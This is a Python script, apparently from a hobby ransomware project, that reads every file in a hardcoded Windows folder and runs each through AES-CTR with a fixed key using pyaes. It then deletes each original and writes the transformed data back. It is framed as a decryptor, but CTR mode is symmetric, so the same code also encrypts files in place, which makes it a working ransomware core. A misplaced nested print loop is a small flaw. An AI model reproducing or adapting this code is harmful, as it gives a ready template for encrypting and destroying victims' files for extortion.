import os
import pyaes


file_dicionario = {}
folder_name = r"C:\python_projects\ransomware\pasta"
key = b"testeransomwares"


for file_name in os.listdir(folder_name):
    file_path = os.path.join(folder_name, file_name)

    if os.path.isfile(file_path):
        with open(file_path, "rb") as file:
            file_data = file.read()
            file_dicionario[file_name] = file_data

    for file_name, content in file_dicionario.items():
        print(f"conteudo do arquivo {file_name,content}")

for file_name, file_data in file_dicionario.items():
    file_path = os.path.join(folder_name, file_name)

    aes = pyaes.AESModeOfOperationCTR(key)

    descrypt = aes.decrypt(file_data)

    os.remove(file_path)

    new_file_path = os.path.join(folder_name, file_name)
    with open(new_file_path, "wb") as new_file:
        new_file.write(descrypt)





